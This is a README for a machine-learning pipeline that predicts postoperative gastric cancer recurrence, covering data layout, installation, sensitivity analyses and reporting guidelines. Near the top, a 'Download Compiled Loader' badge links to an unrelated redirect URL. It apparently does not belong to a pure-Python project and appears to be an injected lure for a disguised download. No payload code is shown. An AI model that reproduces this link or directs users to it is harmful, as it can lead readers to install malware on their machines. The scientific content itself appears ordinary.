# Gastric Cancer Recurrence Prediction — TRIPOD+AI Pipeline

![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)
![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Reproducible analysis code for:

> **Development and External Validation of Machine Learning Models for
> Predicting Postoperative Recurrence in Gastric Cancer:
> A TRIPOD+AI-Compliant Single-Center Cohort Study**  
> *[Author names] — Gastric Cancer (submitted)*

---

## Overview

This repository contains the complete analysis pipeline used in the above
manuscript.  The pipeline:

- Trains six ML classifiers (Logistic Regression, Random Forest, XGBoost,
  LightGBM, CatBoost, MLP) on a development cohort.
- Applies **multivariate iterative imputation** (IterativeImputer with
  BayesianRidge) to handle missing laboratory values.
- Applies **post-hoc sigmoid calibration** (Platt scaling) to all models.
- Evaluates all models in an independent external validation cohort using
  ROC-AUC, calibration slope, Brier score, bootstrapped DCA, and SHAP analysis.
- Follows the **TRIPOD+AI** and **PROBAST** reporting frameworks throughout.

**Recommended model:** Random Forest with iterative imputation and Platt scaling  
(External ROC-AUC = 0.829, calibration slope = 0.896, Brier score = 0.120)

---

## Repository structure

```
gc_recurrence/
├── train_evaluate.py      # Main pipeline script
├── config.yaml            # All parameters in one place
├── requirements.txt
├── .gitignore
├── utils/
│   ├── __init__.py
│   ├── imputation.py      # Imputer factory & fit/transform helpers
│   ├── calibration.py     # PlattCalibrator, IsotonicCalibrator
│   ├── metrics.py         # evaluate_model(), DCA, bootstrap CI
│   └── plots.py           # Figure generation functions
├── data/                  # ← Place your Excel file here (git-ignored)
│   └── .gitkeep
└── outputs/               # Generated figures and CSV (git-ignored)
```

---

## Data format

Place the Excel file at the path specified in `config.yaml`
(`data/gastric_cancer_recurrence.xlsx` by default).

The file must contain **two sheets**:

| Sheet | Content |
|-------|---------|
| `Sheet1` | Development cohort (n = 1,030 in the paper) |
| `Sheet2` | External validation cohort (n = 132 in the paper) |

Each sheet requires the following columns:

| Column | Type | Description |
|--------|------|-------------|
| `recurrence` | 0/1 | Primary outcome (1 = recurrence confirmed) |
| `time_to_recurrence` | float | Time to recurrence or censoring (months) |
| `follow-up_time` | float | Total follow-up duration (months) |
| *(predictor columns)* | float | All numeric predictors (see paper Table 1) |

> **Data availability:** The dataset is not publicly shared to protect patient
> privacy. Requests for data access should be directed to the corresponding
> author.

---

## Installation

```bash
# Clone
git clone https://github.com/[username]/gc_recurrence.git
cd gc_recurrence

# Create virtual environment (recommended)
python -m venv .venv
source .venv/bin/activate        # Linux/macOS
.venv\Scripts\activate.bat       # Windows

# Install dependencies
pip install -r requirements.txt
```

---

## Usage

### Primary analysis (reproduces paper results)

```bash
python train_evaluate.py
```

Runs the pipeline with settings in `config.yaml`:
- Imputation method: **iterative** (IterativeImputer + BayesianRidge)
- Calibration: **Platt scaling**
- Hyperparameters: **default** (EPV = 6.0 < 10; see paper Methods)

### Sensitivity analysis — median imputation

```bash
python train_evaluate.py --imputer median
```

### Sensitivity analysis — hyperparameter tuning

```bash
python train_evaluate.py --tune
```

> ⚠ Tuning increases runtime to ~10 min on a modern CPU.

### All options

```bash
python train_evaluate.py --help
```

```
usage: train_evaluate.py [-h] [--config CONFIG] [--tune] [--imputer {iterative,median}]

options:
  --config    Path to YAML configuration file. (default: config.yaml)
  --tune      Enable RandomizedSearchCV hyperparameter tuning.
  --imputer   Override imputation method: iterative | median.
```

---

## Outputs

All files are saved to the directory specified by `config.output.dir`
(`outputs/` by default):

| File | Description |
|------|-------------|
| `results_summary.csv` | Per-model metrics (all calibration conditions) |
| `best_hyperparameters.json` | Tuned parameters (only with `--tune`) |
| `figure1_calibration.png` | Calibration curves — external validation |
| `figure2_roc.png` | ROC curves — external validation |
| `figure3_dca.png` | Decision curve analysis with bootstrap CI |
| `figure4_shap.png` | Global SHAP feature importance (best model) |
| `figure5_km_dev.png` | Kaplan-Meier — development cohort |
| `figure5_km_ext.png` | Kaplan-Meier — external validation cohort |

---

## Reproducing the paper figures

The manuscript figures correspond to pipeline outputs as follows:

| Paper Fig. | Pipeline output |
|-----------|-----------------|
| Fig. 1 | `figure1_calibration.png` (IterativeImputer vs Median comparison) |
| Fig. 2 | `figure3_dca.png` |
| Fig. 3 | `figure4_shap.png` |
| Fig. 4 | `figure5_km_dev.png` + `figure5_km_ext.png` |

---

## Key methodological decisions

### Why default hyperparameters?

Events-per-variable (EPV) = 137 events / 23 features = **6.0** (recommended
threshold ≥ 10).  A sensitivity analysis using RandomizedSearchCV showed that
tuning improved internal cross-validated ROC-AUC to 0.971–0.980 but improved
external ROC-AUC by only **+0.004** while degrading calibration slope from
0.896 to 0.881.  Under EPV < 10, tuning promotes overfitting; default
parameters were therefore retained for the primary analysis.

### Why IterativeImputer?

T-Chol (29% missing), CRP (18%), and PNI (5%) are correlated with other
patient and tumor variables.  IterativeImputer (BayesianRidge estimator)
preserves inter-variable relationships and improved the external calibration
slope from 0.628 (median imputation) to **0.896** (+0.268) with negligible
change in ROC-AUC (−0.003).

### Why Platt scaling?

Post-hoc sigmoid calibration (Platt scaling) is preferred over isotonic
regression for small external validation cohorts (n = 132) due to lower
variance.

---

## Reporting guidelines

This study adheres to:
- **TRIPOD+AI** (Collins et al. BMJ 2024; doi: 10.1136/bmj-2023-078378)
- **PROBAST** (Wolff et al. Ann Intern Med 2019; doi: 10.7326/M18-1376)

---

## Citation

If you use this code, please cite:

```bibtex
@article{[author]_gastric_cancer_ml_2025,
  title   = {Development and External Validation of Machine Learning Models
             for Predicting Postoperative Recurrence in Gastric Cancer:
             A TRIPOD+AI-Compliant Single-Center Cohort Study},
  author  = {[Author names]},
  journal = {Gastric Cancer},
  year    = {2025},
  doi     = {[DOI]}
}
```

---

## License

This code is released under the [MIT License](LICENSE).  
Patient data are **not** included and are not publicly available.

---

## Contact

[Corresponding author name]  
[Institution, Department]  
[email@institution.jp]
